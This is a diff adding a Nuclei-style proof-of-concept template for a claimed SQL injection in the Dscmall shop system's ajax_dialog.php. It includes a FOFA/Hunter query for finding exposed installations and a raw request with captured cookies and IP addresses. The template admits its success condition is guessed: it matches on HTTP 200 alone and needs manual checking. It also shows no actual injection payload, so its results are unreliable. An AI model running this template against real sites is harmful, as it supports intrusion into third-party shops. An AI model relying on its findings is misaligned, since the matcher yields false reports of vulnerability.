@@ -1,0 +1,37 @@
+id: poc-9b37416fd534098e670e
+info:
+  name: 大商创多用户商城系统ajax_dialog存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9b37416fd534098e670ead86a23fe63f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9b37416fd534098e670ead86a23fe63f
+    fofa: + hunter`app.name="Dscmall"`
+http:
+- raw:
+  - 'GET /ajax_dialog.php?_=1600309513833&act=getUserInfo&brand_id=1&is_jsonp=1&jsoncallback=jQuery19106489774159975068_1600309513832&seckillid=null&temp=backup_tpl_1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: real_ipd=43.198.104.154; dsc_real_ip=43.198.104.154; ECS_ID=caa864f5a2579377c4e39d5518a8e0a807d91019; ECS[visit_times]=1; province=22; city=286; district=0; street=1; street_area=1; session_id_ip=43.198.104.154_caa864f5a2579377c4e39d5518a8e0a8; Hm_lvt_1abd18f2b2abf273be5b81fd42f63a90=1711603825; Hm_lpvt_1abd18f2b2abf273be5b81fd42f63a90=1711603825
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
